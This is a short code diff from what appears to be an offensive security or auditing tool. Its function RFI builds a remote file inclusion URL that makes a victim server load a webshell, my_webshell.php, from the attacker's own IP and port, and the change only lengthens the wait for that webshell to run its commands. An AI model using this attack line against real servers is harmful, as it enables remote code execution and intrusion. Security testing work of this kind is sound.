@@ -110,10 +110,9 @@ def RFI(victim_info, attacker_info, general_info, arguments):
 		    	sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
 		    
 		url = 'http' + s + '://' + v_ip + ':' + v_port + v_rec_path + 'http://' + a_ip + ':' + str(random_port) + '/FileInclusion/my_webshell.php'
-		
 		urllib.request.urlopen(url)
 		# Give time for webshell to execute the commands
-		time.sleep(1)
+		time.sleep(3)
 		
 		try:
 			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1)) 
